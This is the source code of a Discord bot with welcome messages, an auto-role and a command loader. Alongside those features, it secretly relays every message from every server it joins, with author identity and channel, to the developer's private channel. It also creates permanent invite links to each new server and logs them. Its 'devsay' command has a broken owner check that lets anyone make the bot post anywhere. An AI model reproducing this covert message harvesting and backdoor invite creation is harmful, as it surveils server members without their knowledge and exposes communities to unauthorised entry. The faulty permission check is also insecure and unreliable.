const Discord = require("discord.js");
const client = new Discord.Client();
const fs = require("fs");
const config = require("./config.json");
client.commands = new Discord.Collection();


fs.readdir("./commands/", (err, files) => {
    console.log(`Loaded ${files.length} commands.`)
	if(err) console.log(err);
	let jsfile = files.filter(f => f.split(".").pop() === "js");
	if(jsfile.length <= 0){
	console.log("Couldn't find commands.");
	return;
	}


	jsfile.forEach((f, i) =>{
	let props = require(`./commands/${f}`);
	console.log(`${f} loaded!`);
	
	});
    });
    client.on("message", async message => {
        if(message.author.bot) return undefined;
        if(message.channel.type === 'dm') return ;
        
            if(message.content.toLowerCase() === '<@439938462708269066>'){
            let embed = new Discord.RichEmbed()
           .setTitle("Logan Elite")
           .addField("Prefix", "`l!`", true)
           .addField("Help", "`l!help`", true)
           .addField("Found A Bug?",'then do `l!bugreport`')
           .setThumbnail(client.user.displayAvatarURL)
           .setColor(`${message.guild.me.displayHexColor!=='#000000' ? message.guild.me.displayHexColor : 0xffffff}`);
            message.channel.send(embed);
            }
if(message.content.startsWith('<@338192747754160138>')){
message.delete();
let embed = new Discord.RichEmbed()
.setTitle(":speak_no_evil: Sshhh....")
 .setDescription(`Don\'t ping him! PLease He is a very busy Guy!! **${message.author.tag}**`)
.setColor('RANDOM');
message.channel.send(embed)
}

let prefix = "l!";
let args = message.content.slice(prefix.length).trim().split(" ");
let cmd = args.shift().toLowerCase();
if(message.author.bot) return undefined;;
if(!message.content.startsWith(prefix)) return undefined;


try {
let commandFile = require(`./commands/${cmd}.js`);
commandFile.run(client, message, args);
if(!commandFile) return message.channel.send("No command found with that name.");
} catch (e) { console.log(e) }



});

client.on("message", async message => {
    //Emoji: 
   
    const sechan = client.channels.get('451926028693274624');
    if (message.content.length == 0) return;
    var MessageEmbed = new Discord.RichEmbed()
        .setTitle(message.author.username + " " + message.author.id + " " + " sent a message in " + message.guild.name)
        .addField("In channel #" + message.channel.name, message.content)
        .setFooter("l!devsay " + message.channel.id, message.author.displayAvatarURL)
        .setColor('3399FF')
    if (message.channel.id === sechan.id) {} else {
        sechan.send(MessageEmbed)
    }
    });

client.on("message", async message => {
    if (message.author.bot) return;
    if (message.content.indexOf("l!") !== 0) return;
    const args = message.content.slice("l!".length).trim().split(/ +/g);
    const command = args.shift().toLowerCase();
	if (command === "devsay") {
     if (!message.author.id === "338192747754160138") return;
        const sayMessage = args.slice(1).join(" ");
        message.delete().catch(O_o => {});
        const channel = client.channels.get(args[0]);
        channel.send(sayMessage);
	}
	});

  client.on('guildMemberAdd', member => {
	const members = member.guild.memberCount;
	const channel = member.guild.channels.find('name', 'member-log');
	if (!channel) return;
	let role = member.guild.roles.find(`name`, "Member");
	
	let Embed = new Discord.RichEmbed()
	.setTitle(`${member.displayName}, Welcome to ${member.guild.name}`)
    .setColor("RANDOM")	
	.setDescription(`Welcome My Friend!`)
	.addField('Users: ', `${members}`, true)
	channel.send(Embed);
	});
	client.on('guildMemberRemove', member => {
	const channel = member.guild.channels.find('name', 'member-log');
	if (!channel) return;
	const members = member.guild.memberCount;
	let Embed = new Discord.RichEmbed()
    .setColor("RANDOM")
	.setDescription(`${member.displayName}, has left the server! We have ${members} members now.`)

	channel.send(Embed);
    });
    

    client.on('guildCreate', guild => {

        guild.owner.send("Thank You for adding me  Type `l!help` in your server to see my commands! Also ihave made a role for me to give to peple when they join! ")
        
        });

        client.on("guildCreate", async guild => {
            Member = guild.createRole({
                name: "Member",
                color: "#6838db",
                reason: "you needed this (aka auto role)",
                permissions: []
            })
           
            const logsServerJoin = client.channels.get('439917815592517634');
            console.log(`The bot just joined to ${guild.name}, Owned by ${guild.owner.user.tag}`);
            const embed = new Discord.RichEmbed()
            .setColor(0x00AE86)
            .setAuthor(`i Joined ${guild.name}`)
            .setThumbnail(guild.iconURL)
            .addField(":wave: wooo a new Server!!!","cant wait to see whats in it")
            .addField(":white_small_square: Owner", guild.owner)
            .addField(":white_small_square: ID", guild.id, true)
            .addField(":white_small_square: Users", guild.memberCount, true)
            .addField(":white_small_square: Channels", guild.channels.size, true)
      
            logsServerJoin.send(embed);
        
           
        });           

    client.on("guildDelete", guild => {
        const logsServerLeave = client.channels.get('439917815592517634');
        console.log(`The bot has been left ${guild.name}, Owned by ${guild.owner.user.tag}`);
        const embed = new Discord.RichEmbed()
        .setColor(0x00AE86)
        .setAuthor(` i Left ${guild.name}`)
        .setThumbnail(guild.iconURL)
        .addField(":door: :( i was removed ")
        .addField(":white_small_square: Owner", guild.owner)
        .addField(":white_small_square: ID", guild.id, true)
        .addField(":white_small_square: Users", guild.memberCount, true)
       
        logsServerLeave.send(embed);
        
    });
    client.on("ready", function() {
        var clientonmessage = `
    ------------------------------------------------------
    > Logging in...
    ------------------------------------------------------
    Logged in as ${client.user.tag}
    Working on ${client.guilds.size} servers!
    ${client.channels.size} channels and ${client.users.size} users cached!
    I am logged in and ready to roll!
    LET'S GO!
    ------------------------------------------------------
    ----------Bot created by Tea Cup#3433-----------
    ------------------------------------------------------
    -----------------Bot's commands logs------------------`
    
        console.log(clientonmessage);
    })
    function setActivity() {
    //Variable Array for what the setGame can be set to
    var Gameinfo = [`Prefix: l!`, `Running on ${client.guilds.size} Servers`, `Running Commands`, `Try l!help`, `l!help`,
        `Using ${(((process.memoryUsage().heapUsed)/1024)/1024).toFixed(0)}Mb's of RAM`, `Ping to API: ${(client.ping).toFixed(0)} Ms`, `https://is.gd/iOakEh` // Change these to what you want, add as many or as few as you want to
    ]

    var info = Gameinfo[Math.floor(Math.random() * Gameinfo.length)]; //Random Math to set the setGame to something in the GameInfo array

    client.user.setActivity(info) // "playing Game" '...' Sets the setGame to what the info Random math picked from the GameInfo Array
    if (config.debugMode === "1") {
        console.log(`[ LOG ] set Activity set to ( ${info} )`) //Logs to console what the setGame was set as.
    }

}


setInterval(setActivity, 1000 * 60 * 2) //sets and picks a new game every 2 minutes

client.on("guildCreate", async guild => {
    const invite = await guild.channels.first().createInvite({
      maxAge: 0
    });
    console.log(`Joined a new guild named: ${guild.name} with invite: https://discord.gg/${invite.code}`)
  });

client.on("guildMemberAdd", function(member) {
  
    let role = member.guild.roles.find("name", "Member");
    member.addRole(role).catch(console.error);
});


client.login(process.env.token);
